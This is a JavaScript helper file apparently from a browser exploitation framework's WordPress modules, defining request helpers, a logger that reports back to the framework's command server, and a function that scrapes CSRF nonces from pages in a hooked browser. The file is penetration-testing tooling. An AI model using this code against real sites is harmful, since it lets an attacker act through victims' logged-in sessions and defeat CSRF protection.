/*
  Copyright (c) Browser Exploitation Framework (Server) - https://serverproject.com
  See the file 'doc/COPYING' for copying permission
  
  Author @erwan_lr (WPScanTeam) - https://wpscan.org/
*/

// Pretty sure we could use jQuery as it's included by the hook.js
// Also, could have all that in as WP.prototype ?

function log(data, status = null) {
  if (status == 'error') { status = server.are.status_error(); }
  if (status == 'success') { status = server.are.status_success(); }

  server.net.send(server_command_url, server_command_id, data, status);
  server.debug(data);
};

function get(absolute_path, success) {
  var xhr = new XMLHttpRequest();

  xhr.open('GET', absolute_path);
  xhr.responseType = 'document';

  xhr.onerror = function() { log('GET ' + absolute_path + ' could not be done', 'error'); }
  
  xhr.onload = function() {
    //log('GET ' + absolute_path + ' resulted in a code ' + xhr.status);
    
    success(xhr);
  }

  xhr.send();
}

function post(absolute_path, data, success) {
  var params = typeof data == 'string' ? data : Object.keys(data).map(
    function(k){ return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]) }
  ).join('&');

  var xhr = new XMLHttpRequest();

  xhr.open('POST', absolute_path);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  xhr.onerror = function() { log('POST ' + absolute_path + ' could not be done', 'error'); }
  
  xhr.onload = function() {
    //log('POST ' + absolute_path + ' resulted in a code ' + xhr.status);

    success(xhr);
  }

  xhr.send(params);
}

function post_as_binary(absolute_path, boundary, data, success) {
  var xhr = new XMLHttpRequest();

  // for WebKit-based browsers
  if (!XMLHttpRequest.prototype.sendAsBinary) {
    XMLHttpRequest.prototype.sendAsBinary = function (sData) {
      var nBytes = sData.length, ui8Data = new Uint8Array(nBytes);
      
      for (var nIdx = 0; nIdx < nBytes; nIdx++) {
         ui8Data[nIdx] = sData.charCodeAt(nIdx) & 0xff;
      }
      /* send as ArrayBufferView...: */
      this.send(ui8Data);
    };
  }

  xhr.open('POST', absolute_path);
  xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary );

  xhr.responseType = 'document';

  xhr.onerror = function() { log('POST (Binary)' + absolute_path + ' could not be done', 'error'); }
  
  xhr.onload = function() {
    //log('POST (Binary) ' + absolute_path + ' resulted in a code ' + xhr.status);

    success(xhr);
  }

  xhr.sendAsBinary(data);
}

function get_nonce(absolute_path, nonce_id, success) {
  get(absolute_path, function(xhr) {
    if (xhr.status == 200) {
      var nonce_tag = xhr.responseXML.getElementById(nonce_id);
      
      if (nonce_tag == null) {
        log(absolute_path + ' - Unable to find nonce tag with id ' + nonce_id, 'error');
      }
      else {
        nonce = nonce_tag.getAttribute('value');

        //log('GET ' + absolute_path + ' - Nonce: ' + nonce);

        success(nonce);
      }
    } else {
      log('GET ' + absolute_path + ' - Status: ' + xhr.status, 'error');
    }
  });
}

